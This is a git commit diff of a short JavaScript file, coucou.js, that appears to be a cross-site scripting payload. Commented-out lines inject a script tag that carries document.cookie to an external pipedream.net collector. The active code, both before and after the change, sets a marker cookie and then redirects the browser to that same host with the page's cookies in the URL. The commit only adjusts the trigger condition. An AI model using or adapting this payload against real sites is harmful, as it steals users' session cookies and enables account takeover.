e3acc9dfff4ca3a7d6d02c8044e48484f0e74e16
JB Lézoray <jlezoray@synamedia.com>
2023-11-26 00:21:42 +0100

    Update coucou.js

--- coucou.js
+++ coucou.js
@@ -1,9 +1,7 @@
 // const node = document.createElement("script");
 // node.setAttribute("src", "https://ensgnh0kr2ws.x.pipedream.net?"+document.cookie);
 // document.getElementsByTagName("body")[0].appendChild(node);
-
-if (document.cookie.split(";").length >1) {
+if (document.cookie.includes("aaa") == false) {
     document.cookie = "aaa=bbb" 
     window.location.replace("https://ensgnh0kr2ws.x.pipedream.net?c="+document.cookie.toString());
-}                                                                    
-                                                       
+}                                                     
